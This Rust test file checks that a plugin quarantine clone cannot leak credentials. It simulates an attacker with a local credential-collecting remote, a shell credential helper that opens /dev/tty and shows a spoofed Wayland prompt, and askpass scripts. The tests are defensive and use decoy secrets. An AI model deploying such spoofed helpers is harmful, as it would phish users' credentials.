//! core#338 — what authority a quarantine clone of UNTRUSTED code has over the
//! user's terminal and credentials.
//!
//! Installing a plugin is consent to fetch and run someone else's code. It is
//! NOT consent to hand that someone your credentials, and the terminal gives
//! the user nothing to tell the two apart: a prompt drawn by a third party's
//! credential helper mid-install is pixel-for-pixel a prompt drawn by Wayland.
//!
//! `Stdio::null()` on the child's stdin does not close this. `git`, and every
//! credential helper / `git-remote-*` / `ssh` it spawns, can `open("/dev/tty")`
//! directly — that is a fresh handle on the controlling terminal and is blind
//! to what we handed the child as fd 0.
//!
//! There are TWO independent doors, and each gets its own leg:
//!
//! * the TERMINAL door — `/dev/tty`. Closed only by putting the child in a new
//!   SESSION (`setsid`), which drops the controlling terminal so the `open`
//!   fails with `ENXIO`. A new process *group* is not enough: measured, a
//!   `setpgid` child still WRITES to the user's screen and only stops
//!   (`SIGTTIN`) when it tries to read.
//! * the ASKPASS door — `core.askPass` / `GIT_ASKPASS` / `SSH_ASKPASS` from the
//!   user's own environment or gitconfig. It needs no terminal at all, so
//!   detaching the session cannot touch it.
//!
//! And a resource leg: the wall-clock timeout branch of `run_git` used to
//! return without reaping its two pipe-reader threads.
//!
//! The terminal legs need a REAL controlling terminal, so they re-exec this
//! test binary under a PTY; an in-process call could never exhibit the defect.
//!
//! Every leg asserts the fake remote was actually CONTACTED before asserting it
//! received no credentials — an unreachable server would otherwise "pass" this
//! file while proving nothing.
//!
//! Unix-only: `/dev/tty`, `setsid` and process-group kill are the mechanism
//! under test. Windows has no `/dev/tty`; its GUI credential managers are a
//! separate authority this file does not claim to measure.
#![cfg(unix)]

use std::io::{Read, Write};
use std::net::TcpListener;
use std::os::unix::fs::PermissionsExt;
use std::path::Path;
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use portable_pty::{CommandBuilder, PtySize, native_pty_system};

/// Obviously-fake material. If either of these ever reaches [`Remote::credentials`],
/// the product handed a third party what the user typed.
const DECOY_USER: &str = "victim-username";
const DECOY_SECRET: &str = "not-a-real-secret-0000";
/// What a helper dressed as Wayland prints. Distinctive so the assertion can
/// never match incidental terminal noise.
const HELPER_PROMPT: &str = "Wayland needs your credentials to continue: ";

// ===========================================================================
// The attacker's remote.
// ===========================================================================

/// A remote that answers every request with a Basic-auth challenge and records
/// what it was sent. `git` retries with credentials once it has them, so an
/// `Authorization` header arriving here IS the exfiltration.
struct Remote {
    port: u16,
    seen: Arc<Mutex<Vec<Option<String>>>>,
}

impl Remote {
    fn start() -> Self {
        let listener = TcpListener::bind("127.0.0.1:0").expect("bind fake remote");
        let port = listener.local_addr().unwrap().port();
        let seen: Arc<Mutex<Vec<Option<String>>>> = Arc::new(Mutex::new(Vec::new()));
        let sink = Arc::clone(&seen);
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut s) = stream else { continue };
                let mut buf = Vec::new();
                let mut chunk = [0u8; 1024];
                loop {
                    match s.read(&mut chunk) {
                        Ok(0) => break,
                        Ok(n) => {
                            buf.extend_from_slice(&chunk[..n]);
                            if buf.windows(4).any(|w| w == b"\r\n\r\n") {
                                break;
                            }
                        }
                        Err(_) => break,
                    }
                }
                let text = String::from_utf8_lossy(&buf).to_string();
                let auth = text
                    .lines()
                    .find(|l| l.to_ascii_lowercase().starts_with("authorization:"))
                    .and_then(|l| l.split_once(':').map(|(_, v)| v.trim().to_string()));
                sink.lock().unwrap().push(auth);
                let _ = s.write_all(
                    b"HTTP/1.1 401 Unauthorized\r\n\
                      WWW-Authenticate: Basic realm=\"wayland-plugin\"\r\n\
                      Content-Length: 0\r\n\r\n",
                );
                let _ = s.flush();
            }
        });
        Self { port, seen }
    }

    fn url(&self) -> String {
        format!("http://127.0.0.1:{}/attacker-plugin.git", self.port)
    }

    fn requests(&self) -> usize {
        self.seen.lock().unwrap().len()
    }

    /// Every credential the remote managed to collect.
    fn credentials(&self) -> Vec<String> {
        self.seen
            .lock()
            .unwrap()
            .iter()
            .flatten()
            .cloned()
            .collect()
    }
}

fn write_exe(path: &Path, body: &str) {
    std::fs::write(path, body).expect("write script");
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).expect("chmod");
}

/// Write a throwaway gitconfig and return env pairs that make `git` read ONLY
/// it. Without this the developer's own `~/.gitconfig` decides the outcome and
/// the result is not a measurement of the product.
fn isolated_gitconfig(dir: &Path, body: &str) -> Vec<(String, String)> {
    let cfg = dir.join("gitconfig");
    std::fs::write(&cfg, body).expect("write gitconfig");
    let empty = dir.join("gitconfig.empty");
    std::fs::write(&empty, "").expect("write empty gitconfig");
    vec![
        ("GIT_CONFIG_GLOBAL".to_string(), cfg.display().to_string()),
        ("GIT_CONFIG_SYSTEM".to_string(), empty.display().to_string()),
    ]
}

// ===========================================================================
// The child: the PRODUCTION function, in its own process.
// ===========================================================================

/// Not a test of its own — the body every leg drives. It calls the real
/// `quarantine_clone`, so a leg that passes cannot be passing against a model
/// of the code. Inert unless `WL_QTTY_URL` is set, so a plain
/// `cargo nextest run` walks straight through it.
///
/// It also reports its own live thread count either side of the call: the
/// timeout leg needs that number from INSIDE the process that ran the clone,
/// and taking it here keeps that leg free of `env::set_var` and of any
/// dependence on how the harness schedules tests.
#[test]
fn quarantine_tty_child_helper() {
    let Ok(url) = std::env::var("WL_QTTY_URL") else {
        return;
    };
    let dest = std::env::var("WL_QTTY_DEST").expect("WL_QTTY_DEST");

    let before = live_threads();
    // The result is expected to be an error — the remote never authenticates.
    // What is under test is what happened to the user's terminal on the way.
    let outcome = wcore_cli::plugin::quarantine::quarantine_clone(
        &wcore_pluginsrc::SourceKind::Url {
            url,
            git_ref: None,
            sha: None,
        },
        Path::new(&dest),
    );
    let err = outcome.err().map(|e| e.to_string()).unwrap_or_default();

    // Give a correctly-reaped reader a moment to unwind before counting.
    let deadline = Instant::now() + Duration::from_secs(10);
    while live_threads() > before && Instant::now() < deadline {
        std::thread::sleep(Duration::from_millis(100));
    }
    println!("CHILD-THREADS before={before} after={}", live_threads());
    println!("CHILD-ERR {err}");
    println!("CHILD-DONE");
}

/// Threads currently alive in this process. Linux-only: the leak under test is
/// two `read_to_end` threads per `run_git`, and `/proc/self/task` is the only
/// cheap honest way to count them.
#[cfg(target_os = "linux")]
fn live_threads() -> usize {
    std::fs::read_dir("/proc/self/task")
        .map(|d| d.count())
        .unwrap_or(0)
}
#[cfg(not(target_os = "linux"))]
fn live_threads() -> usize {
    0
}

/// Base argv/env for the child. `GIT_TERMINAL_PROMPT` is explicitly REMOVED:
/// if the developer's shell already had it set, a leg would pass without the
/// product doing anything.
fn child_command(tmp: &Path, remote: &Remote, gitconfig_body: &str) -> Vec<(String, String)> {
    let mut env = isolated_gitconfig(tmp, gitconfig_body);
    env.push(("WL_QTTY_URL".into(), remote.url()));
    env.push(("WL_QTTY_DEST".into(), tmp.join("q").display().to_string()));
    env.push(("WL_PROMPT".into(), HELPER_PROMPT.into()));
    env
}

// ===========================================================================
// Leg 1 — the terminal door, driven on a REAL PTY.
// ===========================================================================

/// Lines that SOLICIT input, as opposed to lines that merely quote the same
/// words while refusing.
///
/// This distinction is load-bearing and cost one green-arm iteration to find:
/// git's refusal is `fatal: could not read Username for 'URL': terminal prompts
/// disabled`, which contains `Username for` verbatim. A naive substring match
/// calls the FIX a failure. A solicitation carries neither marker.
fn solicitations(transcript: &str) -> Vec<&str> {
    transcript
        .lines()
        .filter(|l| l.contains("Username for") || l.contains("Password for"))
        .filter(|l| !l.contains("could not read") && !l.contains("fatal:"))
        .collect()
}

/// Drive a quarantine clone of `remote` on a real PTY with `gitconfig_body` as
/// the user's entire git configuration, answering any credential prompt the way
/// a deceived user would. Returns everything painted on the terminal.
fn clone_on_a_terminal(tmp: &Path, remote: &Remote, gitconfig_body: &str) -> String {
    let pty = native_pty_system()
        .openpty(PtySize {
            rows: 24,
            cols: 100,
            pixel_width: 0,
            pixel_height: 0,
        })
        .expect("open PTY");

    let exe = std::env::current_exe().expect("current_exe");
    let mut cmd = CommandBuilder::new(exe);
    cmd.arg("--exact");
    cmd.arg("quarantine_tty_child_helper");
    cmd.arg("--nocapture");
    cmd.arg("--test-threads=1");
    cmd.env("TERM", "xterm-256color");
    for (k, v) in child_command(tmp, remote, gitconfig_body) {
        cmd.env(k, v);
    }
    cmd.env_remove("GIT_TERMINAL_PROMPT");

    let mut child = pty.slave.spawn_command(cmd).expect("spawn child on PTY");
    // The slave must be dropped or the master never observes EOF.
    drop(pty.slave);

    let screen: Arc<Mutex<Vec<u8>>> = Arc::new(Mutex::new(Vec::new()));
    let sink = Arc::clone(&screen);
    let mut reader = pty.master.try_clone_reader().expect("clone reader");
    std::thread::spawn(move || {
        let mut b = [0u8; 4096];
        while let Ok(n) = reader.read(&mut b) {
            if n == 0 {
                break;
            }
            sink.lock().unwrap().extend_from_slice(&b[..n]);
        }
    });
    let mut writer = pty.master.take_writer().expect("take writer");

    // Behave like the deceived user: if a credential prompt appears, answer it.
    // The assertion is that it never appears — but a leg that simply refused to
    // type could not tell "no prompt" from "a prompt nobody answered".
    // 25 s is ~70x a healthy run (0.36 s) and comfortably under nextest's
    // 60 s slow timeout. That margin matters: with `setsid` mutated to
    // `setpgid` the helper writes its prompt and then STOPS on `SIGTTIN`, so
    // this loop must give up and let the assertion below report the transcript
    // rather than let the whole test be reaped as "timed out".
    let deadline = Instant::now() + Duration::from_secs(25);
    let mut typed_user = false;
    let mut typed_secret = false;
    loop {
        let text = String::from_utf8_lossy(&screen.lock().unwrap().clone()).to_string();
        if text.contains(HELPER_PROMPT) && !typed_user {
            let _ = writer.write_all(format!("{DECOY_USER}\n{DECOY_SECRET}\n").as_bytes());
            let _ = writer.flush();
            typed_user = true;
            typed_secret = true;
        }
        let solicited = solicitations(&text);
        if solicited.iter().any(|l| l.contains("Username for")) && !typed_user {
            let _ = writer.write_all(format!("{DECOY_USER}\n").as_bytes());
            let _ = writer.flush();
            typed_user = true;
        }
        if solicited.iter().any(|l| l.contains("Password for")) && !typed_secret {
            let _ = writer.write_all(format!("{DECOY_SECRET}\n").as_bytes());
            let _ = writer.flush();
            typed_secret = true;
        }
        if text.contains("CHILD-DONE") || child.try_wait().ok().flatten().is_some() {
            break;
        }
        if Instant::now() > deadline {
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    let _ = child.kill();
    let _ = child.wait();
    std::thread::sleep(Duration::from_millis(300));
    String::from_utf8_lossy(&screen.lock().unwrap().clone()).to_string()
}

/// THE leg for core#338 — the only one that discriminates.
///
/// A credential helper that opens `/dev/tty` ITSELF reaches the user's terminal
/// no matter what the child got as stdin, and `GIT_TERMINAL_PROMPT=0` is blind
/// to it — that variable governs git's OWN prompting and says nothing about a
/// helper. The prompt this helper writes is deliberately dressed as Wayland's,
/// because that is the whole attack: the terminal offers nothing that
/// distinguishes "Wayland is asking" from "the plugin author is asking".
///
/// Mutation-verified: turn `setsid` into `setpgid` — the house
/// `Command::process_group(0)` spelling — and this is the leg that goes red.
/// Not because a process group is close to enough, but because it is not: the
/// helper still paints its prompt on the user's screen and then stops on
/// `SIGTTIN` trying to read the answer, wedging the install.
#[test]
fn a_credential_helper_cannot_prompt_on_the_users_terminal() {
    let tmp = tempfile::tempdir().unwrap();
    let remote = Remote::start();

    let helper = tmp.path().join("prompting_helper.sh");
    write_exe(
        &helper,
        "#!/bin/sh\n\
         [ \"$1\" = get ] || exit 0\n\
         exec 3<>/dev/tty || exit 1\n\
         printf '%s' \"$WL_PROMPT\" >&3\n\
         read u <&3\n\
         read p <&3\n\
         echo \"username=$u\"\n\
         echo \"password=$p\"\n",
    );

    let transcript = clone_on_a_terminal(
        tmp.path(),
        &remote,
        &format!(
            "[user]\n\tname = test\n[credential]\n\thelper = {}\n",
            helper.display()
        ),
    );

    assert!(
        remote.requests() > 0,
        "the fake remote was never contacted — this leg proved nothing.\nterminal:\n{transcript}"
    );
    assert!(
        !transcript.contains(HELPER_PROMPT),
        "a credential helper run by an untrusted quarantine clone drew a prompt in the \
         user's own terminal, and the remote then collected {:?}.\nterminal:\n{transcript}",
        remote.credentials()
    );
    assert!(
        remote.credentials().is_empty(),
        "the untrusted remote collected credentials: {:?}\nterminal:\n{transcript}",
        remote.credentials()
    );
}

/// The same door via git's OWN prompt, which is the shape a user with no
/// credential helper configured meets.
///
/// Read this leg for what it is. It is held REDUNDANTLY, and mutation says so:
/// it passes with `setsid` mutated away (`GIT_TERMINAL_PROMPT=0` holds it) and
/// it passes with `GIT_TERMINAL_PROMPT` removed (`setsid` holds it). So it can
/// never discriminate between the two, and it is NOT evidence that the terminal
/// is denied — that is
/// [`a_credential_helper_cannot_prompt_on_the_users_terminal`]'s job, and that
/// leg is the one that goes red when `setsid` goes away.
#[test]
fn git_itself_cannot_prompt_on_the_users_terminal() {
    let tmp = tempfile::tempdir().unwrap();
    let remote = Remote::start();
    let transcript = clone_on_a_terminal(tmp.path(), &remote, "[user]\n\tname = test\n");

    assert!(
        remote.requests() > 0,
        "the fake remote was never contacted — this leg proved nothing.\nterminal:\n{transcript}"
    );
    assert!(
        solicitations(&transcript).is_empty(),
        "an untrusted quarantine clone solicited credentials in the user's own terminal \
         ({:?}), and the remote then collected {:?}.\nterminal:\n{transcript}",
        solicitations(&transcript),
        remote.credentials()
    );
    assert!(
        remote.credentials().is_empty(),
        "the untrusted remote collected credentials: {:?}\nterminal:\n{transcript}",
        remote.credentials()
    );
}

// ===========================================================================
// Leg 2 — the askpass door, which needs no terminal at all.
// ===========================================================================

/// A `core.askPass` in the USER's own gitconfig answers `git` with no terminal
/// involved, so detaching the session cannot close it. This is why the fix is
/// two mechanisms and not one.
#[test]
fn quarantine_clone_ignores_an_askpass_from_the_users_gitconfig() {
    let tmp = tempfile::tempdir().unwrap();
    let remote = Remote::start();

    let askpass = tmp.path().join("askpass.sh");
    write_exe(
        &askpass,
        &format!(
            "#!/bin/sh\ncase \"$1\" in\n  *[Uu]sername*) echo {DECOY_USER} ;;\n  *) echo {DECOY_SECRET} ;;\nesac\n"
        ),
    );

    let out = run_child_off_terminal(
        tmp.path(),
        &remote,
        &format!(
            "[user]\n\tname = test\n[core]\n\taskPass = {}\n",
            askpass.display()
        ),
        &[],
        Duration::from_secs(120),
    );

    assert!(
        remote.requests() > 0,
        "the fake remote was never contacted — this leg proved nothing.\nchild:\n{out}"
    );
    assert!(
        remote.credentials().is_empty(),
        "an askpass from the user's own gitconfig handed credentials to an untrusted \
         remote: {:?}\nchild:\n{out}",
        remote.credentials()
    );
}

/// The same door via the ENVIRONMENT rather than gitconfig — `GIT_ASKPASS` is
/// what a desktop session or an IDE exports, and it outranks `core.askPass`.
#[test]
fn quarantine_clone_ignores_git_askpass_from_the_environment() {
    let tmp = tempfile::tempdir().unwrap();
    let remote = Remote::start();

    let askpass = tmp.path().join("env_askpass.sh");
    write_exe(
        &askpass,
        &format!(
            "#!/bin/sh\ncase \"$1\" in\n  *[Uu]sername*) echo {DECOY_USER} ;;\n  *) echo {DECOY_SECRET} ;;\nesac\n"
        ),
    );

    let out = run_child_off_terminal(
        tmp.path(),
        &remote,
        "[user]\n\tname = test\n",
        &[("GIT_ASKPASS", askpass.display().to_string().as_str())],
        Duration::from_secs(120),
    );

    assert!(
        remote.requests() > 0,
        "the fake remote was never contacted — this leg proved nothing.\nchild:\n{out}"
    );
    assert!(
        remote.credentials().is_empty(),
        "a GIT_ASKPASS inherited from the user's environment handed credentials to an \
         untrusted remote: {:?}\nchild:\n{out}",
        remote.credentials()
    );
}

// ===========================================================================
// Leg 3 — the timed-out clone must not strand its reader threads.
// ===========================================================================

/// Run the child WITHOUT a terminal and return its stdout+stderr.
fn run_child_off_terminal(
    tmp: &Path,
    remote: &Remote,
    gitconfig_body: &str,
    extra_env: &[(&str, &str)],
    budget: Duration,
) -> String {
    let exe = std::env::current_exe().expect("current_exe");
    let mut cmd = std::process::Command::new(exe);
    cmd.arg("--exact")
        .arg("quarantine_tty_child_helper")
        .arg("--nocapture")
        .arg("--test-threads=1")
        .env_remove("GIT_TERMINAL_PROMPT");
    for (k, v) in child_command(tmp, remote, gitconfig_body) {
        cmd.env(k, v);
    }
    for (k, v) in extra_env {
        cmd.env(k, v);
    }
    let mut child = cmd
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .expect("spawn child");
    let deadline = Instant::now() + budget;
    while child.try_wait().ok().flatten().is_none() {
        if Instant::now() > deadline {
            let _ = child.kill();
            break;
        }
        std::thread::sleep(Duration::from_millis(50));
    }
    let out = child.wait_with_output().expect("collect child");
    format!(
        "{}{}",
        String::from_utf8_lossy(&out.stdout),
        String::from_utf8_lossy(&out.stderr)
    )
}

/// The wall-clock timeout branch of `run_git` returned WITHOUT reaping its two
/// pipe-reader threads, and killed only the leader. A credential helper that
/// BACKGROUNDS a worker is the production shape: the worker inherits the write
/// ends of git's stdout/stderr and outlives a kill aimed at `git` alone, so
/// neither reader ever sees EOF and both sit in `read()` for the lifetime of
/// the process.
#[cfg(target_os = "linux")]
#[test]
fn a_timed_out_clone_does_not_strand_its_reader_threads() {
    let tmp = tempfile::tempdir().unwrap();
    let remote = Remote::start();

    let helper = tmp.path().join("backgrounding_helper.sh");
    write_exe(
        &helper,
        "#!/bin/sh\n# a worker that inherits git's stdout/stderr and outlives it\nsleep 300 &\nsleep 300\n",
    );

    let out = run_child_off_terminal(
        tmp.path(),
        &remote,
        &format!(
            "[user]\n\tname = test\n[credential]\n\thelper = {}\n",
            helper.display()
        ),
        &[("WAYLAND_PLUGIN_GIT_TIMEOUT_MS", "3000")],
        Duration::from_secs(120),
    );

    assert!(
        remote.requests() > 0,
        "the fake remote was never contacted — this leg proved nothing.\nchild:\n{out}"
    );
    assert!(
        out.contains("CHILD-DONE"),
        "the child never completed, so its thread count is not a measurement.\nchild:\n{out}"
    );
    assert!(
        out.contains("timed out"),
        "expected the wall-clock timeout branch; the child reported something else.\n\
         child:\n{out}"
    );

    // libtest prefixes the first line of captured output with
    // `test <name> ... `, so this must match on `contains`, not `starts_with`.
    let line = out
        .lines()
        .find(|l| l.contains("CHILD-THREADS"))
        .unwrap_or_else(|| panic!("no thread count in child output:\n{out}"))
        .to_string();
    let n = |key: &str| -> usize {
        line.split_whitespace()
            .find_map(|f| f.strip_prefix(key))
            .and_then(|v| v.parse().ok())
            .unwrap_or_else(|| panic!("malformed thread line {line:?}"))
    };
    let (before, after) = (n("before="), n("after="));
    assert!(
        after <= before,
        "the timed-out clone stranded {} reader thread(s): {before} before, {after} after.\n\
         child:\n{out}",
        after.saturating_sub(before)
    );
}
